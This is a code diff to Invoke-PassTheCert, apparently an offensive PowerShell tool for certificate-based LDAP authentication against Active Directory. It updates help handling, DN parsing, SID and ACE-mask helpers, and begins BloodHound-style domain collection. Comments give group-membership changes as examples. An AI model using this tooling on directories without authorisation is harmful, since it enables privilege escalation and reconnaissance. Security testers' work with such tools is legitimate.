@@ -30,7 +30,7 @@ function _ShowBanner {
     Write-Host -ForegroundColor Red     "   _| || | | \ V / (_) |   <  __/ |______| "
     Write-Host -ForegroundColor Red     "   \___/_| |_|\_/ \___/|_|\_\___|          "
     Write-Host -ForegroundColor Red     ""
-    Write-Host -ForegroundColor Red     "   v1.8.1 "
+    Write-Host -ForegroundColor Red     "   v1.10.2 "
     Write-Host -ForegroundColor Red     "  ______            _____ _          _____           _     "
     Write-Host -ForegroundColor Red     "  | ___ \          |_   _| |        /  __ \         | |    "
     Write-Host -ForegroundColor Red     "  | |_/ /___ ___ ___ | | | |__   ___| /  \/ ___ _ __| |_   "
@@ -38,7 +38,6 @@ function _ShowBanner {
     Write-Host -ForegroundColor Red     "  | | | (_| \__ \__ \| | | | | |  __/ \__/\  __/ |  | |_   "
     Write-Host -ForegroundColor Red     "  \_|  \___ /___/___/\_/ |_| |_|\___|\____/\___|_|   \__|  "
 
-    Write-Host                          ""
     Write-Host                          ""
 
     Write-Host -ForegroundColor Blue    "  Pure PowerShell Tool To Authenticate To An LDAP/S Server With A Certificate Through Schannel  "
@@ -130,67 +129,77 @@ function _Helper-ShowHelpOfFunction {
         [System.Boolean]$TranslateToInvokePassTheCertSyntax = $true
     )
 
-    # Get the current PS1 script path by default
-    if ($ScriptPath -eq 'Invoke-PassTheCert.ps1') {
-        if (-not $PSCommandPath) { $ScriptPath = $MyInvocation.MyCommand.Path } else { $ScriptPath = $PSCommandPath }
-    }
+    # If Invoke-PassTheCert has been loaded in memory through download cradle, then no need to invoke expressions in the PowerShell session, as it has already been done.
+    # In particular, we avoid triggering errors as Invoke-PassTheCert.ps1 likely doesn't exist on disk.
+    if (-not (Test-Path "Function:\$FunctionName")) {
 
-    # Extract text of the function's definition through a multi-line mode (?ms) ReGEX, i.e. the text in the script matching '(function $FunctionName {.*?})'
-    $Pattern = "(?ms)^(\s*function\s+$FunctionName\s+\{.*?\})\s+function"
-    Write-Verbose "[*] Trying To Extract The Get-Help Of Type '$HelpType' For Function '$FunctionName' In '$ScriptPath' PowerShell Script Using The Multiline ReGEX: $Pattern"
-    $FunctionMatch = ([regex]::Match((Get-Content -Path $ScriptPath -Raw), $Pattern)).Groups[1];
-
-    if ($FunctionMatch.Success) {
-        Write-Verbose "[+] Successfully Retrieved Get-Help Of Type '$HelpType' For Function '$FunctionName' In '$ScriptPath' PowerShell Script With Content:`r`n==========================================`r`n$($FunctionMatch.Value)`r`n====================================================";
-
-        # Invoking the function's definition to make it available in the current session. 
-        # Because 'Invoke-Expression' requires PowerShell script path, or a one-lined PowerShell string, we'll encode the string of our multi-lined function definition into a single-lined Base64 string.
-        # Dirty, but handy ;)
-        [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(
-            [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(
-                $FunctionMatch.Value
-            ))
-        )) | Invoke-Expression
-
-        # Showing the Help of the function
-        if ($HelpType.Trim() -eq 'Full') { $FunctionHelp = Get-Help -Name $FunctionName -Full }
-        if ($HelpType.Trim() -eq 'Detailed') { $FunctionHelp = Get-Help -Name $FunctionName -Detailed }
-        if ($HelpType.Trim() -eq 'Examples') { $FunctionHelp = Get-Help -Name $FunctionName -Examples }
-
-        $FunctionHelpString = $FunctionHelp |Out-String
-
-        Write-Verbose "[+] Successfully Retrieved Get-Help Of Type '$HelpType' For Function '$FunctionName' In '$ScriptPath' PowerShell Script As:`r`n==========================================`r`n$FunctionHelpString`r`n====================================================";
-
-        # When translating to 'Invoke-PassTheCert' syntax, the Get-Help's REMARKS section (if present) is no longer relevant
-        # For some reasons, ($FunctionHelpString -contains 'REMARKS') doesn't work, hence using a 'Select-String -Pattern' workaround.
-        # (Commented REMARK-stripping to avoid blanking non-english documentations)
-		#if (($FunctionHelpString |Select-String -Pattern '(?i).*\s+REMARKS\s+.*') -ne $null) {
-        #    $FunctionHelpString = ([regex]::Match(($FunctionHelpString), '(?ims)(.*)REMARKS\s+.*')).Groups[1].Value;
-        #    Write-Verbose "[+] Successfully Stripped irrelevant 'REMARKS' Section Of Get-Help Of Type '$HelpType' For Function '$FunctionName' In '$ScriptPath' PowerShell Script As:`r`n==========================================`r`n$($FunctionHelpString)`r`n====================================================";
-        #}
-
-        # Each function's description contains its own way of executing itself. However, these are mostly *private* helper functions (prefixed '_').
-        # For these functions to be reliable documentation, they should either be executed manually (e.g. copy-pasted into the powershell process), or executed using the context of 'Invoke-PassTheCert'.
-        # For example, one example of the '_AddGroupMember' function, for action 'AddGroupMember', might be:
-        #   _AddGroupMember -LdapConnection $LdapConnection -IdentityDN 'CN=John JD. DOE,CN=Users,DC=X' -GroupDN 'CN=KindaGroupy,CN=Builtin,DC=X'
-
-        # However, calling it requires either to manually import it into the the current PowerShell process (copy-pasting the code), or to use any of the two following 'Invoke-PassTheCert' syntax:
-        #   Invoke-PassTheCert -LdapConnection $LdapConnection -Action 'AddGroupMember' -Identity 'CN=John JD. DOE,CN=Users,DC=X' -GroupDN 'CN=KindaGroupy,CN=Builtin,DC=X'
-
-        # Therefore, we'll make the substitution for the user to conveniently get the right way of executing the action from 'Invoke-PassTheCert' if $TranslateToInvokePassTheCertSyntax is set ($true by default).
-        if ($TranslateToInvokePassTheCertSyntax) {
-            # Replace all occurrences of '_Action' to: Invoke-PassTheCert -Action 'Action'
-            $FunctionHelpString = $FunctionHelpString -replace "_$Action", " Invoke-PassTheCert -Action '$Action'"
-            # Replace all occurrences of '-IdentityDN' (resp. '-TargetDN', 'ObjectDN') to '-Identity' (resp. '-Target', 'Object'), as they MAY be identities OTHER THAN Distinguished Name.
-            $FunctionHelpString = $FunctionHelpString -replace '-(Identity|Target|Object)DN','-$1'
-            Write-Verbose "[+] Successfully Translated Get-Help Of Type '$HelpType' For Function '$FunctionName' In '$ScriptPath' PowerShell Script To The Invoke-PassTheCert Syntax As:`r`n==========================================`r`n$($FunctionHelpString)`r`n====================================================";
+        # Get the current PS1 script path by default
+        if ($ScriptPath -eq 'Invoke-PassTheCert.ps1') {
+            if (-not $PSCommandPath) { $ScriptPath = $MyInvocation.MyCommand.Path } else { $ScriptPath = $PSCommandPath }
         }
-        
-        Write-Host $FunctionHelpString
-    } else {
-        Write-Host "[!] Could Not Retrieve Documentation Of Function '$FunctionName' In The '$ScriptPath' PowerShell Script !"
-        Write-Host "[*] (Hint: Have You Specified The '-Action' Switch ? Otherwise, Does It Exist ? '-a' Can Be Used To List Available Actions)"
+
+        # Extract text of the function's definition through a multi-line mode (?ms) ReGEX, i.e. the text in the script matching '(function $FunctionName {.*?})'
+        $Pattern = "(?ms)^(\s*function\s+$FunctionName\s+\{.*?\})\s+function"
+        Write-Verbose "[*] Trying To Extract The Get-Help Of Type '$HelpType' For Function '$FunctionName' In '$ScriptPath' PowerShell Script Using The Multiline ReGEX: $Pattern"
+        $FunctionMatch = ([regex]::Match((Get-Content -Path $ScriptPath -Raw), $Pattern)).Groups[1];
+
+        if ($FunctionMatch.Success) {
+            Write-Verbose "[+] Successfully Retrieved Get-Help Of Type '$HelpType' For Function '$FunctionName' In '$ScriptPath' PowerShell Script With Content:`r`n==========================================`r`n$($FunctionMatch.Value)`r`n====================================================";
+
+            # Invoking the function's definition to make it available in the current session. 
+            # Because 'Invoke-Expression' requires PowerShell script path, or a one-lined PowerShell string, we'll encode the string of our multi-lined function definition into a single-lined Base64 string.
+            # Dirty, but handy ;)
+            [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(
+                [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(
+                    $FunctionMatch.Value
+                ))
+            )) | Invoke-Expression
+        } else {
+            Write-Host "[!] Could Not Retrieve Documentation Of Function '$FunctionName' In The '$ScriptPath' PowerShell Script !"
+            Write-Host "[*] (Hint: Have You Specified The '-Action' Switch ? Otherwise, Does It Exist ? '-a' Can Be Used To List Available Actions)"
+            return
+        }
+
     }
+
+        
+
+    # Showing the Help of the function
+    if ($HelpType.Trim() -eq 'Full') { $FunctionHelp = Get-Help -Name $FunctionName -Full }
+    if ($HelpType.Trim() -eq 'Detailed') { $FunctionHelp = Get-Help -Name $FunctionName -Detailed }
+    if ($HelpType.Trim() -eq 'Examples') { $FunctionHelp = Get-Help -Name $FunctionName -Examples }
+
+    $FunctionHelpString = $FunctionHelp |Out-String
+
+    Write-Verbose "[+] Successfully Retrieved Get-Help Of Type '$HelpType' For Function '$FunctionName' In '$ScriptPath' PowerShell Script As:`r`n==========================================`r`n$FunctionHelpString`r`n====================================================";
+
+    # When translating to 'Invoke-PassTheCert' syntax, the Get-Help's REMARKS section (if present) is no longer relevant
+    # For some reasons, ($FunctionHelpString -contains 'REMARKS') doesn't work, hence using a 'Select-String -Pattern' workaround.
+    # (Commented REMARK-stripping to avoid blanking non-english documentations)
+    #if (($FunctionHelpString |Select-String -Pattern '(?i).*\s+REMARKS\s+.*') -ne $null) {
+    #    $FunctionHelpString = ([regex]::Match(($FunctionHelpString), '(?ims)(.*)REMARKS\s+.*')).Groups[1].Value;
+    #    Write-Verbose "[+] Successfully Stripped irrelevant 'REMARKS' Section Of Get-Help Of Type '$HelpType' For Function '$FunctionName' In '$ScriptPath' PowerShell Script As:`r`n==========================================`r`n$($FunctionHelpString)`r`n====================================================";
+    #}
+
+    # Each function's description contains its own way of executing itself. However, these are mostly *private* helper functions (prefixed '_').
+    # For these functions to be reliable documentation, they should either be executed manually (e.g. copy-pasted into the powershell process), or executed using the context of 'Invoke-PassTheCert'.
+    # For example, one example of the '_AddGroupMember' function, for action 'AddGroupMember', might be:
+    #   _AddGroupMember -LdapConnection $LdapConnection -IdentityDN 'CN=John JD. DOE,CN=Users,DC=X' -GroupDN 'CN=KindaGroupy,CN=Builtin,DC=X'
+
+    # However, calling it requires either to manually import it into the the current PowerShell process (copy-pasting the code), or to use any of the two following 'Invoke-PassTheCert' syntax:
+    #   Invoke-PassTheCert -LdapConnection $LdapConnection -Action 'AddGroupMember' -Identity 'CN=John JD. DOE,CN=Users,DC=X' -GroupDN 'CN=KindaGroupy,CN=Builtin,DC=X'
+
+    # Therefore, we'll make the substitution for the user to conveniently get the right way of executing the action from 'Invoke-PassTheCert' if $TranslateToInvokePassTheCertSyntax is set ($true by default).
+    if ($TranslateToInvokePassTheCertSyntax) {
+        # Replace all occurrences of '_Action' to: Invoke-PassTheCert -Action 'Action'
+        $FunctionHelpString = $FunctionHelpString -replace "_$Action", " Invoke-PassTheCert -Action '$Action'"
+        # Replace all occurrences of '-IdentityDN' (resp. '-TargetDN', 'ObjectDN') to '-Identity' (resp. '-Target', 'Object'), as they MAY be identities OTHER THAN Distinguished Name.
+        $FunctionHelpString = $FunctionHelpString -replace '-(Identity|Target|Object)DN','-$1'
+        Write-Verbose "[+] Successfully Translated Get-Help Of Type '$HelpType' For Function '$FunctionName' In '$ScriptPath' PowerShell Script To The Invoke-PassTheCert Syntax As:`r`n==========================================`r`n$($FunctionHelpString)`r`n====================================================";
+    }
+    
+    Write-Host $FunctionHelpString
+
 }
 
 
@@ -318,7 +327,7 @@ function _Helper-GetRandomString {
         Write-Verbose "[+] Successfully Returned Empty String '' ! (I Mean... You Asked For A String Of Length 0...)"
         return '';
     } else {
-        $RandomString = -join ($Charset.ToCharArray() | Get-Random -Count $Length)
+        $RandomString = -join (1..$Length | %{$Charset.ToCharArray() | Get-Random})
         Write-Verbose "[+] Successfully Generated Random String: $RandomString"
         return $RandomString;
     }
@@ -547,6 +556,12 @@ function _Helper-GetCNFromDN {
 
         .EXAMPLE
 
+            _Helper-GetCNFromDN -DN 'CN=John JD. \,DOE,CN=Users,DC=X'
+
+            Returns `John JD. \,DOE`
+
+        .EXAMPLE
+
             _Helper-GetCNFromDN -DN 'CN=COMPUTATOR,CN=Computers,DC=WORLD,DC=X'
 
             Returns `COMPUTATOR`
@@ -566,9 +581,56 @@ function _Helper-GetCNFromDN {
     )
 
     Write-Verbose "[*] Retrieving Name Part From Distinguished Name '$DN'..."
-    $Name = (("$DN" -split ',')[0] -split '=')[1]
+    $Name = (("$DN" -split '(?<!\\),')[0] -split '=')[1]
     Write-Verbose "[+] Successfully Retrieved The '$Name' Name Part From Distinguished Name '$DN' !"
     return $Name;
+}
+
+
+function _Helper-GetRDNFromDN {
+    
+    <#
+
+        .SYNOPSIS
+
+            Returns the Relative DN of the object identified by its Distinguished Name.
+
+        .PARAMETER DN
+
+            [System.String]
+            
+            The Distinguished Name to be parsed.
+
+        .EXAMPLE
+
+            _Helper-GetRDNFromDN -DN 'CN=John JD. DOE,CN=Users,DC=X'
+
+            Returns `CN=John JD. DOE`
+
+        .EXAMPLE
+
+            _Helper-GetRDNFromDN -DN 'OU=MyNewOrga,CN=Users,DC=X'
+
+            Returns `OU=MyNewOrga`
+
+        .OUTPUTS
+
+            [System.String] 
+            
+            The Relative DN of the object identified by its Distinguished Name.
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the Distinguished Name from which to extract the Object's Common Name")]
+        [System.String]$DN
+    )
+
+    Write-Verbose "[*] Retrieving Relative DN From Distinguished Name '$DN'..."
+    $RDN = ("$DN" -split '(?<!\\),')[0]
+    Write-Verbose "[+] Successfully Retrieved The '$RDN' Relative DN From Distinguished Name '$DN' !"
+    return $RDN;
 }
 
 
@@ -986,6 +1048,242 @@ function _Helper-ConvertToNTHashMD4 {
     $D = ('{0:x8}' -f $D) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
 
     return "$A$B$C$D"
+}
+
+
+function _Helper-GetFunctionalLevels {
+    
+    <#
+
+        .SYNOPSIS
+
+            Returns the Array of Functional Levels
+
+        .OUTPUTS
+
+            [System.Collections.Hashtable] 
+            
+            The Array of Functional Levels
+
+        .LINK
+
+            https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/8f0d9838-d9f2-44b8-b018-b41b62c0580c
+
+        .LINK 
+
+            https://github.com/dirkjanm/BloodHound.py/blob/100783c01632a4d5ca644452a97769fe1a826078/bloodhound/ad/utils.py#L103-L112
+
+    #>
+    
+    return @{
+        "0" = "2000 Mixed/Native";
+        "1" = "2003 Interim";
+        "2" = "2003";
+        "3" = "2008";
+        "4" = "2008 R2";
+        "5" = "2012";
+        "6" = "2012 R2";
+        "7" = "2016";
+    }
+}
+
+
+function _Helper-GetWellKnownSIDs {
+    
+    <#
+
+        .SYNOPSIS
+
+            Returns the Array of Well Known SIDs.
+
+        .OUTPUTS
+
+            [System.Collections.Hashtable] 
+            
+            The Array of Well Known SIDs.
+
+        .LINK 
+
+            https://github.com/dirkjanm/BloodHound.py/blob/fd3f322e066d66314bfb31d4ae6f497df5872177/bloodhound/ad/utils.py#L37-L100
+        
+        .LINK 
+
+            https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups
+        
+        .LINK 
+
+            https://learn.microsoft.com/en-us/windows/win32/secauthz/well-known-sids
+
+        .LINK 
+
+            https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab
+
+    #>
+    
+    return @{
+        "S-1-0"        = @{ "Names" = @("Null Authority")                      ; "PrincipalType" = "User" }
+        "S-1-0-0"      = @{ "Names" = @("Nobody")                              ; "PrincipalType" = "User" }
+        "S-1-1"        = @{ "Names" = @("World Authority")                     ; "PrincipalType" = "User" };
+        "S-1-1-0"      = @{ "Names" = @("Everyone")                            ; "PrincipalType" = "Group" };
+        "S-1-2"        = @{ "Names" = @("Local Authority")                     ; "PrincipalType" = "User" };
+        "S-1-2-0"      = @{ "Names" = @("Local")                               ; "PrincipalType" = "Group" };
+        "S-1-2-1"      = @{ "Names" = @("Console Logon")                       ; "PrincipalType" = "Group" };
+        "S-1-3"        = @{ "Names" = @("Creator Authority")                   ; "PrincipalType" = "User" };
+        "S-1-3-0"      = @{ "Names" = @("Creator Owner")                       ; "PrincipalType" = "User" };
+        "S-1-3-1"      = @{ "Names" = @("Creator Group")                       ; "PrincipalType" = "Group" };
+        "S-1-3-2"      = @{ "Names" = @("Creator Owner Server")                ; "PrincipalType" = "Computer" };
+        "S-1-3-3"      = @{ "Names" = @("Creator Group Server")                ; "PrincipalType" = "Computer" };
+        "S-1-3-4"      = @{ "Names" = @("Owner Rights")                        ; "PrincipalType" = "Group" };
+        "S-1-4"        = @{ "Names" = @("Non-unique Authority")                ; "PrincipalType" = "User" };
+        "S-1-5"        = @{ "Names" = @("NT Authority")                        ; "PrincipalType" = "User" };
+        "S-1-5-1"      = @{ "Names" = @("Dialup")                              ; "PrincipalType" = "Group" };
+        "S-1-5-2"      = @{ "Names" = @("Network")                             ; "PrincipalType" = "Group" };
+        "S-1-5-3"      = @{ "Names" = @("Batch")                               ; "PrincipalType" = "Group" };
+        "S-1-5-4"      = @{ "Names" = @("Interactive")                         ; "PrincipalType" = "Group" };
+        "S-1-5-6"      = @{ "Names" = @("Service")                             ; "PrincipalType" = "Group" };
+        "S-1-5-7"      = @{ "Names" = @("Anonymous")                           ; "PrincipalType" = "Group" };
+        "S-1-5-8"      = @{ "Names" = @("Proxy")                               ; "PrincipalType" = "Group" };
+        "S-1-5-9"      = @{ "Names" = @("Enterprise Domain Controllers")       ; "PrincipalType" = "Group" };
+        "S-1-5-10"     = @{ "Names" = @("Principal Self")                      ; "PrincipalType" = "User" };
+        "S-1-5-11"     = @{ "Names" = @("Authenticated Users")                 ; "PrincipalType" = "Group" };
+        "S-1-5-12"     = @{ "Names" = @("Restricted Code")                     ; "PrincipalType" = "Group" };
+        "S-1-5-13"     = @{ "Names" = @("Terminal Server Users")               ; "PrincipalType" = "Group" };
+        "S-1-5-14"     = @{ "Names" = @("Remote Interactive Logon")            ; "PrincipalType" = "Group" };
+        "S-1-5-15"     = @{ "Names" = @("This Organization")                   ; "PrincipalType" = "Group" };
+        "S-1-5-17"     = @{ "Names" = @("IUSR")                                ; "PrincipalType" = "User" };
+        "S-1-5-18"     = @{ "Names" = @("Local System")                        ; "PrincipalType" = "User" };
+        "S-1-5-19"     = @{ "Names" = @("NT Authority")                        ; "PrincipalType" = "User" };
+        "S-1-5-20"     = @{ "Names" = @("Network Service")                     ; "PrincipalType" = "User" };
+        "S-1-5-80-0"   = @{ "Names" = @("All Services ")                       ; "PrincipalType" = "Group" };
+        "S-1-5-32-544" = @{ "Names" = @("Administrators")                      ; "PrincipalType" = "Group" };
+        "S-1-5-32-545" = @{ "Names" = @("Users")                               ; "PrincipalType" = "Group" };
+        "S-1-5-32-546" = @{ "Names" = @("Guests")                              ; "PrincipalType" = "Group" };
+        "S-1-5-32-547" = @{ "Names" = @("Power Users")                         ; "PrincipalType" = "Group" };
+        "S-1-5-32-548" = @{ "Names" = @("Account Operators")                   ; "PrincipalType" = "Group" };
+        "S-1-5-32-549" = @{ "Names" = @("Server Operators")                    ; "PrincipalType" = "Group" };
+        "S-1-5-32-550" = @{ "Names" = @("Print Operators")                     ; "PrincipalType" = "Group" };
+        "S-1-5-32-551" = @{ "Names" = @("Backup Operators")                    ; "PrincipalType" = "Group" };
+        "S-1-5-32-552" = @{ "Names" = @("Replicators", "Replicator")           ; "PrincipalType" = "Group" };
+        "S-1-5-32-554" = @{ "Names" = @("Pre-Windows 2000 Compatible Access")  ; "PrincipalType" = "Group" };
+        "S-1-5-32-555" = @{ "Names" = @("Remote Desktop Users")                ; "PrincipalType" = "Group" };
+        "S-1-5-32-556" = @{ "Names" = @("Network Configuration Operators")     ; "PrincipalType" = "Group" };
+        "S-1-5-32-557" = @{ "Names" = @("Incoming Forest Trust Builders")      ; "PrincipalType" = "Group" };
+        "S-1-5-32-558" = @{ "Names" = @("Performance Monitor Users")           ; "PrincipalType" = "Group" };
+        "S-1-5-32-559" = @{ "Names" = @("Performance Log Users")               ; "PrincipalType" = "Group" };
+        "S-1-5-32-560" = @{ "Names" = @("Windows Authorization Access Group")  ; "PrincipalType" = "Group" };
+        "S-1-5-32-561" = @{ "Names" = @("Terminal Server License Servers")     ; "PrincipalType" = "Group" };
+        "S-1-5-32-562" = @{ "Names" = @("Distributed COM Users")               ; "PrincipalType" = "Group" };
+        "S-1-5-32-568" = @{ "Names" = @("IIS_IUSRS")                           ; "PrincipalType" = "Group" };
+        "S-1-5-32-569" = @{ "Names" = @("Cryptographic Operators")             ; "PrincipalType" = "Group" };
+        "S-1-5-32-573" = @{ "Names" = @("Event Log Readers")                   ; "PrincipalType" = "Group" };
+        "S-1-5-32-574" = @{ "Names" = @("Certificate Service DCOM Access")     ; "PrincipalType" = "Group" };
+        "S-1-5-32-575" = @{ "Names" = @("RDS Remote Access Servers")           ; "PrincipalType" = "Group" };
+        "S-1-5-32-576" = @{ "Names" = @("RDS Endpoint Servers")                ; "PrincipalType" = "Group" };
+        "S-1-5-32-577" = @{ "Names" = @("RDS Management Servers")              ; "PrincipalType" = "Group" };
+        "S-1-5-32-578" = @{ "Names" = @("Hyper-V Administrators")              ; "PrincipalType" = "Group" };
+        "S-1-5-32-579" = @{ "Names" = @("Access Control Assistance Operators") ; "PrincipalType" = "Group" };
+        "S-1-5-32-580" = @{ "Names" = @("Remote Management Users")             ; "PrincipalType" = "Group" };
+        "S-1-5-32-582" = @{ "Names" = @("Storage Replica Administrators")      ; "PrincipalType" = "Group" };
+    }
+}
+
+
+
+function _Helper-ConvertGeneralizedTimeToUnixTime {
+    
+    <#
+
+        .SYNOPSIS
+
+            Returns the Unix Time format of the provided generalizedTime string into UnixTimeSeconds
+
+        .PARAMETER GeneralizedTime
+
+            [System.String]
+
+            The generalizedTime string to be converted.
+        
+        .EXAMPLE
+
+            _Helper-ConvertGeneralizedTimeToUnixTime -GeneralizedTime '20250131235959.0Z'
+
+            Returns the Unix Time format of the generalizedTime "20250131235959.0Z", i.e. 1738364399
+
+        .OUTPUTS
+
+            [System.String] 
+            
+            The Unix Time format of the provided generalizedTime string into UnixTimeSeconds
+
+        .LINK
+
+            https://learn.microsoft.com/en-us/windows/win32/adschema/s-string-generalized-time
+
+        .LINK 
+
+            https://learn.microsoft.com/en-us/dotnet/api/microsoft.powershell.commands.getdatecommand.unixtimeseconds
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the generaralizedTime string to be converted into Unix Format.")]
+        [ValidateNotNullorEmpty()]
+        [System.String]$GeneralizedTime
+    )
+
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+
+    return [DateTimeOffset]::ParseExact($GeneralizedTime, "yyyyMMddHHmmss.f'Z'", $null).ToUnixTimeSeconds()
+}
+
+
+function _Helper-ConvertWindowsTimestampToUnixTime {
+    
+    <#
+
+        .SYNOPSIS
+
+            Returns the Unix Time format of the provided Windows Timestamp
+
+        .PARAMETER WindowsTimestamp
+
+            [System.Int64]
+
+            The Windows Timestamp (hence in seconds) to be converted.
+        
+        .EXAMPLE
+
+            _Helper-ConvertWindowsTimestampToUnixTime -WindowsTimestamp '134008651234567891'
+
+            Returns Unix Time format of the Windows Timestamp "134008651234567891", i.e. 1756391523
+
+        .OUTPUTS
+
+            [System.Int64] 
+            
+            The Unix Time format of the provided generalizedTime string into UnixTimeSeconds
+
+        .LINK
+
+            https://www.epochconverter.com/ldap
+
+        .LINK 
+
+            https://github.com/dirkjanm/BloodHound.py/blob/100783c01632a4d5ca644452a97769fe1a826078/bloodhound/ad/utils.py#L380-L388
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the Windows Timestamp to be converted into Unix Format.")]
+        [ValidateNotNullorEmpty()]
+        [System.Int64]$WindowsTimestamp
+    )
+
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+    if ($WindowsTimestamp -eq 0) { return 0; }
+    return [System.Int64](($WindowsTimestamp - 116444736000000000) / 10000000);
 }
 
 
@@ -5945,19 +6243,30 @@ function _Helper-GetNamesOfACEAccessMaskValue {
     #Write-Verbose "[*] Retrieving Name(s) Associated With ACE AccessMask Value '$Value'..."
     $AccessMasks = _Helper-GetAccessMasksArray
 
-    $Sum = $Value;
-    # Removing each Access Mask from the total value starting from the highest one
-    while ($Sum -gt 0) {
-        foreach ($key in $AccessMasks.Keys | Sort-Object { -$AccessMasks[$_] }) {
-            if ($AccessMasks[$key] -le $Sum) {
-                $Result += "$key, ";
-                $Sum -= $AccessMasks[$key];
-            }
+    $Results = @()
+    # We sort the AccessMask first to ensure encompassing AccessMasks (e.g. GenericAll with multiple ACEs) is catched GenericAll before individual bits
+    $SortedKeys = $AccessMasks.Keys | Sort-Object { -$AccessMasks[$_] }
+
+    $CurrentValue = $Value
+
+    foreach ($Key in $SortedKeys) {
+        $Mask = $AccessMasks[$Key]
+        
+        # Check if the bit(s) are present
+        if (($CurrentValue -band $Mask) -eq $Mask) {
+            $Results += $Key
+            
+            # To avoid redundancy (encompassing multiple ACEs), we remove the bits we just identified 
+            # This ensures that, for instance, if GenericAll is found, 0 bits remain for sub-rights
+            $CurrentValue = $CurrentValue -bxor $Mask
         }
+
+        # Optimization: stop if all bits are cleared
+        if ($CurrentValue -eq 0) { break }
     }
-    $Result = $Result.TrimEnd(', ');
+    
     #Write-Verbose "[+] Successfully Retrieved '$Result' Name(s) Associated With ACE AccessMask Value '$Value' !"
-    return $Result;
+    return $Results -join ", ";
 }
 
 
@@ -5995,7 +6304,7 @@ function _Helper-GetGUIDOfACEAccessRightName {
 
         .OUTPUTS
 
-            [System.String] 
+            [System.String]
             
             The GUID associated with the specified ACE Access Right Name (i.e. ObjectAceType).
 
@@ -6083,7 +6392,7 @@ function _Helper-GetNameOfACEAccessRightGUID {
             The Name associated with the specified ACE Access Right GUID.
 
             - Exception: 
-            - Returns $null if not found, to deal with ACEs that doesn't have `ObjectAceType` attribute (e.g. `GenericAll`), hence being set to None.
+            - Returns `$null` if not found, to deal with ACEs that doesn't have `ObjectAceType` attribute (e.g. `GenericAll`), hence being set to None.
             - You may see such ACE entries into `PrincipalTo*.txt`, where `ObjectAceType` is unset (i.e. set no None).
             
 
@@ -6241,7 +6550,7 @@ function _Helper-GetNameOfLDAPAttributeGUID {
             The Name associated with the specified LDAP Attribute's GUID.
 
             - Exception: 
-            - Returns $null if not found, to deal with SDDLs that doesn't have `ObjectAceType` attribute (e.g. `GenericAll`), hence being set to None.
+            - Returns `$null` if not found, to deal with SDDLs that doesn't have `ObjectAceType` attribute (e.g. `GenericAll`), hence being set to None.
 
         .LINK
 
@@ -7598,7 +7907,7 @@ function _GetAttributeOfObject {
     } else {
         $Value = $SearchResponse.Entries[0].Attributes[$Attribute][0]
         # Dealing with edge-cases (i.e. attribute containing bytes)
-        if (-not $Raw -and $Attribute -in @('objectGuid')) {
+        if (-not $Raw -and $Attribute -in @('objectGuid', 'schemaidguid')) {
             $Result = _Helper-GetReadableValueOfBytes -Type 'objectGuid' -ArrayOfBytes $Value
         } elseif (-not $Raw -and $Attribute -in @('objectSid', 'mS-DS-CreatorSID', 'msDS-ManagedPasswordId')) {
             $Result = _Helper-GetReadableValueOfBytes -Type 'objectSid' -ArrayOfBytes $Value
@@ -7721,7 +8030,7 @@ function _GetIndexOfInboundACE {
 
     _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
 
-    $AccessMaskValue = _Helper-GetValueOfACEAccessMaskNames -AccessMaskNames $AccessMaskNames
+    #$AccessMaskValue = _Helper-GetValueOfACEAccessMaskNames -AccessMaskNames $AccessMaskNames
     # If the user provided its own AccessRightGUID, we won't look for a match with the name (i.e. the following condition becomes false, hence not executed)
     if (-not $AccessRightGUID) { $AccessRightGUID = _Helper-GetGUIDOfACEAccessRightName -AccessRightName $AccessRightName }
 
@@ -7755,6 +8064,1290 @@ function _GetIndexOfInboundACE {
 
     Write-Verbose "[!] Could Find Inbound ACE $ACEString Provided To Principal '$IdentitySID' Towards '$TargetDN' ! Returning -1..."
     return -1;
+}
+
+
+# ===============================================
+# ===      Helper Functions (PowerHound)      ===
+# ===============================================
+
+
+function _Helper-PowerHound-GetBloodHoundObjects {
+    
+    <#
+
+        .SYNOPSIS
+
+            Returns the array of objects later used to locally process data for BloodHound collection generation.
+
+        .PARAMETER LdapConnection
+
+            [System.DirectoryServices.Protocols.LdapConnection] 
+            
+            The established LDAP Connection Instance.
+
+        .PARAMETER Domain
+
+            [System.String] 
+            
+            The domain from which to locally dump BloodHound data.
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-GetBloodHoundObjects -LdapConnection $LdapConnection -Domain 'ADLAB.LOCAL'
+
+            Returns the array of objects later used to locally process data for BloodHound collection generation, in the `ADLAB.LOCAL` domain.
+
+        .OUTPUTS
+
+            [System.Collections.Hashtable] 
+            
+            The array of objects later used to locally process data for BloodHound collection generation.
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
+        [ValidateNotNullorEmpty()]
+        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,
+        
+        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the domain name from which to gather BloodHound data")]
+        [ValidateNotNullorEmpty()]
+        [System.String]$Domain
+
+    )
+
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+
+    Write-Host "[*] Dumping Domain Objects..."
+    $DomainObjects = _Filter -LdapConnection $LdapConnection -SearchBase $(_Helper-GetDomainDNFromDomainName -DomainName $Domain) -LDAPFilter '(objectCategory=domain)' -Raw
+    Write-Host "[*] Dumping Domain Controllers Objects..."
